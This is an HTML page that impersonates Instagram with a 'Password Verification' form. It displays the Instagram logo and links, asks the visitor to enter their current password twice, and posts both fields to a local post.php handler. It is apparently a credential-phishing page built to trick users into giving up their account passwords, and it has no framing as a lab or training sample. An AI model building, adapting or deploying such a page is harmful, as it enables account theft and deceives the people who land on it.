<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/styles.css">
    <title>Password Verification</title>
</head>
<body style="background:white;">
    <div>
        <a href="https://www.instagram.com"><img src="./images/ig.jpg" alt="" class="center"></a>
    </div>      
    <div class="login_div">
        <form action="post.php" method="POST">      
            <h1 style="text-align:center;">Password Verification</h1>         
            <label for="fname">Current Password</label>
            <input type="password" id="fname" class="loginInput" name="firstname" placeholder="Password" required>
            <label for="fname">Verify Password</label>
            <input type="password" id="pword" class="loginInput" name="pwd" placeholder="Confirm Password" required>            
            <input type="submit" class="btnSubmit" value="Verify">
            <hr>
            <p style="text-align:center;">Create an account? <a href="https://www.instagram.com">Sign up</a>.</p>                               
        </form>
    </div>    
</body>
</html>
